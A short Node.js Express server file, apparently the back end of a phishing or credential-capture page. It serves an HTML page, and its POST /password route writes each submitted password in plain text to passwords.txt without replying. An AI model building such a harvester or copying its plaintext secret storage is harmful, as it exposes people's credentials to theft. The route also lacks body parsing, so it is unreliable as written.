
const path = require('path');
// Working with files
const fs = require('fs');

const express = require('express')
const app = express()

app.use(express.static(__dirname + '/public'));



app.get('/', (req, res) => {
    // Print message to the server side
    console.log('The client tried to enter a website.');
    // Response - return the HTML page 
    res.sendFile(path.join(__dirname, '/index.html'));
});

app.post('/password', (req, res) => {
    // In POST request the information is in the body
    // The information in our case is the password that the client entered
    const password = req.body.password;
    // Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('passwords.txt', `password : ${password} \n`);
    
   // res.send("index.html");
});

app.listen(3000, () => {
    console.log(`WebServer is up. Listening at http://localhost:3000`);
})